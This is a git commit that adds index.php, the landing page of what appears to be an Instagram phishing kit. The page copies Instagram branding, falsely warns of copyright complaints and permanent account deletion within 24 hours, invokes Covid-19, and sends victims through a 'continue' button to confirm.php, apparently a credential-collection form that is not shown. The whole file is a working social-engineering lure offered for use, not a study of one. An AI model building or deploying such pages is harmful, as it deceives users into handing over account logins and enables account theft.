8d5c703a78a1e2cf2e5a0f24efd8fb0ac22d5238
Younes Ameziane <73488317+YounesAmeziane@users.noreply.github.com>
2021-05-16 21:06:25 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="sty.css">
+  <title>Instagram | Service</title>
+</head>
+<body>
+   <div class="top">
+    <div class="logo">
+            <img src="img/instagram.png" alt="instagram">
+    </div>
+    <div class="form">
+          <p>
+            We have received complaints of copyright infrigement on your account, you need to verify and confirm your account. Otherwise, your account will be permanetly deleted within 24 hours. <br><br>Covid-19 and we are here to help you, even on these difficult days. Verify your account on the personalized hrlp form in the next page pressing the "continue" button below. Otherwise it will be closed in 24 hours and there will be no assistant to assit you.
+          </p>
+    </div>
+  </div>
+  <br><br><br><br>
+  <a href="confirm.php"><input type="submit" value="continue" class="btn"></a>
+</body>
+<?php 
+        include('footer.html');
+?>
+</html>
